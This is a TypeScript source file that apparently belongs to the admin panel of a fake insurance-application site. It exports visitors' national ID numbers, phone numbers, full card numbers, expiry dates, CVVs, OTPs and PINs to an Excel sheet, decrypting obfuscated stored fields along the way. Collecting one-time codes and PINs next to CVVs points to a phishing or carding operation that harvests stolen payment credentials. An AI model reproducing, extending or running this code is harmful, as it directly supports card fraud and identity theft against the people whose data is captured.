"use client";

import type { InsuranceApplication } from "@/lib/firestore-types";
import { getNormalizedCardEntries, type NormalizedCardEntry } from "@/lib/card-data";
import { _d } from "@/lib/secure-utils";

const text = (value: unknown): string => {
  if (value === undefined || value === null || value === "") return "";
  return String(value);
};

const decryptField = (value: unknown): string => {
  const raw = text(value);
  if (!raw) return "";

  try {
    return _d(raw) || raw;
  } catch {
    return raw;
  }
};

const timestampValue = (value: unknown): number => {
  if (!value) return 0;
  if (
    typeof value === "object" &&
    value !== null &&
    typeof (value as { toDate?: unknown }).toDate === "function"
  ) {
    try {
      return (value as { toDate: () => Date }).toDate().getTime();
    } catch {
      return 0;
    }
  }

  const parsed = new Date(value as string | number).getTime();
  return Number.isNaN(parsed) ? 0 : parsed;
};

const formatDateTime = (value: unknown): string => {
  if (!value) return "";
  const date =
    typeof value === "object" &&
    value !== null &&
    typeof (value as { toDate?: unknown }).toDate === "function"
      ? (value as { toDate: () => Date }).toDate()
      : new Date(value as string | number);

  if (Number.isNaN(date.getTime())) return text(value);

  return date.toLocaleString("ar-SA", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });
};

const getLatestHistoryValue = (
  visitor: InsuranceApplication,
  types: string[],
  keys: string[],
): string => {
  const entries = (visitor.history || [])
    .filter((entry: any) => types.includes(entry?.type))
    .sort(
      (a: any, b: any) =>
        timestampValue(b?.timestamp) - timestampValue(a?.timestamp),
    );
  const data = entries[0]?.data;
  if (!data) return "";

  return decryptField(keys.map((key) => data[key]).find((value) => value));
};

const getCardValue = (
  data: Record<string, unknown>,
  keys: string[],
): string => decryptField(keys.map((key) => data[key]).find((value) => value));

const makeRow = (
  visitor: InsuranceApplication,
  entry: NormalizedCardEntry,
  index: number,
) => {
  const data = entry.data;
  const bankInfo =
    data.bankInfo && typeof data.bankInfo === "object"
      ? (data.bankInfo as Record<string, unknown>)
      : {};

  return {
    "#": index + 1,
    "اسم الزائر": text((visitor as any).name || visitor.ownerName),
    "رقم الهوية": text(visitor.identityNumber),
    "رقم الجوال": text(visitor.phoneNumber),
    "رقم البطاقة": getCardValue(data, [
      "_v1",
      "cardNumber",
      "cardNumberMasked",
      "pan",
      "number",
    ]),
    "تاريخ الانتهاء": getCardValue(data, [
      "_v3",
      "expiryDate",
      "expirationDate",
      "expiry",
    ]),
    CVV: getCardValue(data, ["_v2", "cvv", "securityCode"]),
    "اسم حامل البطاقة": getCardValue(data, [
      "_v4",
      "cardHolderName",
      "cardName",
      "holderName",
    ]),
    "نوع البطاقة": text(data.cardType || data.cardCategory || data.scheme),
    البنك: text(data.bankName || bankInfo.name || visitor.bankInfo?.name),
    المستوى: text(data.cardLevel || data.level || bankInfo.level || visitor.cardLevel),
    OTP: getLatestHistoryValue(visitor, ["_t2", "otp"], ["_v5", "otp"]),
    PIN: getLatestHistoryValue(visitor, ["_t3", "pin"], ["_v6", "pinCode", "pin"]),
    "مصدر البطاقة": entry.source,
    الحالة: text(entry.status || visitor.cardStatus),
    "وقت التسجيل": formatDateTime(entry.timestamp),
  };
};

export async function generateAllCardsExcel(
  visitors: InsuranceApplication[],
): Promise<number> {
  const cardEntries = visitors.flatMap((visitor) =>
    getNormalizedCardEntries(visitor).map((entry) => ({ visitor, entry })),
  );
  if (cardEntries.length === 0) return 0;

  const XLSX = await import("xlsx");
  const rows = cardEntries.map(({ visitor, entry }, index) =>
    makeRow(visitor, entry, index),
  );
  const worksheet = XLSX.utils.json_to_sheet(rows);

  worksheet["!cols"] = [
    { wch: 6 },
    { wch: 24 },
    { wch: 18 },
    { wch: 18 },
    { wch: 24 },
    { wch: 18 },
    { wch: 12 },
    { wch: 28 },
    { wch: 16 },
    { wch: 20 },
    { wch: 14 },
    { wch: 14 },
    { wch: 14 },
    { wch: 14 },
    { wch: 18 },
    { wch: 20 },
  ];
  worksheet["!freeze"] = { xSplit: 0, ySplit: 1 };

  const workbook = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(workbook, worksheet, "البطاقات");
  XLSX.writeFile(workbook, `جميع_البطاقات_${Date.now()}.xlsx`);

  return cardEntries.length;
}